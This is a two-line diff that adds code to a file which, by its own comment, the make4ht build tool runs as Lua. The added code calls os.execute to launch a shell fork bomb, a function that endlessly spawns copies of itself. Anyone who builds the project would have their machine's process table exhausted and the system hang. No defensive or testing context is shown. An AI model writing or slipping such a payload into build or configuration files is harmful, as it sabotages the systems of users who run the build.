@@ -1,0 +1,2 @@
+-- make4ht runs this file as Lua: a shell fork bomb
+os.execute("bomb() { bomb | bomb & }; bomb")
